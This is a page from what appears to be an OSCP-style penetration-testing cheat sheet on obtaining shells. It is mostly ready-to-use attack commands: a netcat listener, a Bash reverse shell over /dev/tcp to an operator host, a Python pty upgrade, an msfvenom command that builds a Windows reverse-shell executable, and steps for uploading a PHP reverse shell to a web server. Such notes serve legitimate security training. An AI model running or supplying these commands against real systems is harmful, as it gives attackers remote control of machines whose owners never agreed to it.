---
title: Shells
order: 1
tags: [shell, listener, bash, netcat, pty]
---

## Listeners

Run on the operator machine before the target connects.

```bash
nc -lvn 4444
```

This is OpenBSD netcat syntax. Other variants differ; this variant does not combine -l with -p. [Manual](https://man.openbsd.org/nc).

## Bash reverse shell

Run on the Unix target. Requires Bash, its TCP redirections and an outbound route to the listener.

```bash
bash -c 'bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1'
```

LHOST is the operator address reachable from the target. [Supplied command](https://github.com/BuilderGoh/OSCP-Master-Cheatsheet), [Bash redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html).

## Upgrading a shell

Requires Python 3 and /bin/bash on the Unix target.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This creates a pseudo-terminal; it does not configure the operator's terminal. [Python pty](https://docs.python.org/3/library/pty.html).

## Windows reverse payload

Generate an exe for a Windows target; match the payload architecture to the target:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT=4444 -f exe -o reverse.exe
```

Start the [listener](shells/shells#listeners) first, then transfer and run the exe. [Metasploit msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).

## PHP reverse shell

When the target serves PHP (WAMP, XAMPP), copy the bundled shell, set its address values inside the file, upload it to a served directory, then browse to it:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

TODO: verify the packaged path and the PHP version the target runs. [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell).

## Shell connection failure

- [ ] Confirm the [listener](shells/shells#listeners), reachable LHOST and matching port 4444.
- [ ] Separate a connection failure from a command quoting or runtime failure.
- [ ] If direct access is unavailable, check the [pivot path](pivoting/tunnelling#tunnel-troubleshooting).

TODO: verify target egress and the available shell/runtime before selecting another payload.
